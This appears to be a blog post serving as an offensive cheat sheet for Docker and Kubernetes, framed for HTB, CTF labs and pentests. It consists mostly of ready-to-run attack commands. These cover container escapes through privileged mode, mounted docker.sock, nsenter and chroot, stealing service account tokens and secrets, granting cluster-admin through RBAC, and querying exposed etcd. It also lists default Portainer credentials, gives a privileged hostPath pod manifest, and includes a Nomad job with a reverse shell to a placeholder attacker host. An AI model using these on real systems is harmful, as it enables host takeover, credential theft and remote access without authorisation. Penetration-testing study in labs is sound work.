---
layout: post
title: "Docker & Kubernetes Abuse Cheatsheet"
subtitle: "Container escapes, docker.sock exploitation, K8s privilege escalation and misconfigurations for HTB, CTFs and cloud pentests"
tags: [docker, kubernetes, containers, privesc, cloud, htb, ctf]
---

A practical cheat sheet for attacking Docker and Kubernetes environments during HTB, CTFs, cloud labs and real-world container security assessments.

---

# 0. ESSENTIAL TOOLS

## Container Enumeration & Escapes
- **docker CLI**
- **containerd / ctr / crictl**
- **nsenter**
- **linpeas** (detects containerization)
- **pspy**

## Kubernetes Tools
- **kubectl**
- **kube-hunter**
- **kube-bench**
- **k9s**

## Useful repos
- **GTFOBins**
- **Evil-Kube** → https://github.com/raesene/evil-kube
- **BadPods / BadContainers** examples

---

# 1. DETECTING YOU ARE IN A CONTAINER

## Basic detection
```

cat /proc/1/cgroup

```

Indicators:
- `/docker/`
- `/kubepods/`
- `/containerd/`

## Check namespaces
```

lsns

```

## Check capabilities
```

capsh --print

```

---

# 2. DOCKER ENUMERATION

## List environment variables
```

env

```

## Check mounts
```

mount
cat /proc/mounts

```

Look for:
- `/var/run/docker.sock`
- `/` mounted
- `/root` from host

## List running processes
```

ps aux

```

---

# 3. DOCKER PRIVILEGE ESCALATION MISCONFIGS

# 3.1 Privileged Mode → Full Escape
If container is run with `--privileged`:
```

mount /dev/sda1 /mnt
chroot /mnt

```

---

# 3.2 Host Filesystem Mount → Escape
If host directories are mounted:
```

chroot /host bash

```

Or:
```

nsenter --target 1 --mount --uts --ipc --net --pid

```

---

# 3.3 docker.sock Mounted → Full Host Takeover

Check:
```

ls -l /var/run/docker.sock

```

Exploit:
```

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

```

Or:
```

docker -H unix:///var/run/docker.sock ps

```

Spawn privileged container:
```

docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -i -n bash

```

---

# 3.4 Capability Abuse

Check:
```

capsh --print

```

Dangerous caps:
- `CAP_SYS_ADMIN`
- `CAP_SYS_PTRACE`
- `CAP_DAC_READ_SEARCH`

If SYS_ADMIN available:
```

mount /dev/sda1 /mnt
chroot /mnt

```

---

# 3.5 Escaping via /proc

If host PID namespace mapped:
```

nsenter --target 1 -m -u -n -p /bin/bash

```

---

# 4. DOCKER BREAKOUT TRICKS

## Escape via Docker binary inside container
```

docker -H unix:///var/run/docker.sock run -v /:/mnt -it ubuntu bash

```

## Escape via privileged container
```

docker run -it --privileged ubuntu bash

```

---

# 5. KUBERNETES ENUMERATION

## Cluster info
```

kubectl cluster-info

```

## List pods
```

kubectl get pods -A

```

## Service account token
```

cat /var/run/secrets/kubernetes.io/serviceaccount/token

```

Test permissions:
```

kubectl --token <TOKEN> auth can-i --list

```

---

# 6. K8S PRIVILEGE ESCALATION PATHS

# 6.1 Service Account Misconfig
```

kubectl auth can-i --list --token $TOKEN

```

# 6.2 Docker Socket Mount Inside Pod
```

docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine sh

```

# 6.3 Privileged Pod Escape
```

nsenter -t 1 -m -u -n -p bash

```

# 6.4 HostPath Volume Abuse
```

kubectl exec -it pod -- chroot /host bash

```

# 6.5 RBAC Misconfig
If can create pods:
```

kubectl run pwn --image=alpine -it -- sh

```

If can bind cluster-admin:
```

kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default

```

---

# 7. K8S SECRETS & CONFIGMAPS

List secrets:
```

kubectl get secrets -A

```

Decode:
```

kubectl get secret <name> -o jsonpath="{.data.password}" | base64 -d

```

---

# 8. ATTACKING ETCD (K8s Database)

If exposed:
```

curl -k [https://etcd:2379/v2/keys/](https://etcd:2379/v2/keys/)

```

Possible loot:
- Secrets
- Service accounts
- Pod definitions

---

# 9. CLUSTER TAKEOVER VIA PRIVILEGED POD

Example privileged pod:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  containers:
  - name: privesc
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 99999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: root
  volumes:
  - name: root
    hostPath:
      path: /
```

Deploy:

```
kubectl apply -f pod.yaml
```

Escape:

```
chroot /host sh
```

---

# 10. COMMON CTF WEAKNESSES (QUICK WINS)

* docker.sock exposure
* Privileged pods
* HostPath path: "/" mounts
* Weak RBAC
* Exposed API server
* SYS_ADMIN inside container
* hostPID / hostNetwork
* container runtime misconfigs

---

# 11. PORTAINER & CONTAINER MANAGEMENT PLATFORMS ABUSE

Portainer, Rancher, Docker Swarm UIs, K3s dashboards and Hashicorp Nomad UIs appear often in HTB/CTFs — and usually mean **full host compromise**.

---

## 11.1 Detecting Portainer or Similar UIs

### Common ports

```
9000    # Portainer (classic)
9443    # Portainer HTTPS
8000    # Portainer Edge agent
2375    # Docker API
8080    # Rancher / K3s UI
4646    # Nomad
```

### Fingerprint

```
curl -I http://TARGET:9000
curl http://TARGET:9000/api/status
```

Signs:

* `X-Portainer-Version`
* `/api/docker/`
* `/api/auth`

---

## 11.2 Default Credentials (Often in HTB)

```
admin:admin
admin:Password123
root:root
```

---

## 11.3 If Login Works → Full Host Takeover

### 11.3.1 Mount Host Filesystem via UI

Add Container → Volumes:

```
Host path: /
Container path: /host
```

Inside:

```
chroot /host bash
```

→ Host root.

---

### 11.3.2 Spawn Privileged Container

Enable **Privileged** in UI.

Or via API:

```
POST /api/endpoints/1/docker/containers/create
{
  "HostConfig": { "Privileged": true }
}
```

Inside:

```
nsenter -t 1 -m -u -n -p bash
```

---

## 11.4 Using Docker API through Portainer

If 2375 exposed:

```
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 run -v /:/mnt -it alpine chroot /mnt sh
```

---

## 11.5 Portainer Edge Agent Abuse

If open:

```
curl http://TARGET:8000
```

You can register your own controller → deploy containers → mount host → root takeover.

---

## 11.6 Rancher / K3s Dashboard Abuse

Check:

```
https://TARGET:8443
/v3/users
/v3/projects
```

Create privileged pod:

```
kubectl run pwn --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true}}]}}'
```

Inside:

```
nsenter -t 1 bash
```

---

## 11.7 Nomad UI (Very Common in HTB)

Nomad UI at:

```
http://TARGET:4646/ui/
```

Submit malicious job:

```
nomad job run evil.nomad
```

Example:

```hcl
driver = "raw_exec"
command = "/bin/sh"
args    = ["-c", "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"]
```

Raw_exec enabled → instant host RCE.

---

## 11.8 Detecting You Are Inside a Portainer/Rancher Container

```
env | grep KUBERNETES
cat /proc/self/cgroup
mount | grep docker
```

Try host escalation:

```
nsenter -t 1 -m -u -n -p bash
```

---

# Final Notes

This cheat sheet covers:

* Docker privilege escalation
* Namespace, capability & mount-based container escapes
* docker.sock exploitation
* Kubernetes token, RBAC and pod misconfigurations
* hostPath, privileged, and hostPID breakouts
* Secrets/ConfigMaps harvesting
* ETCD exploitation
* Rancher/Portainer/Swarm/Nomad UI abuses
* Full container-to-host takeover paths

Perfect for HTB, CTFs, cloud security labs and real-world container/K8s pentests.

---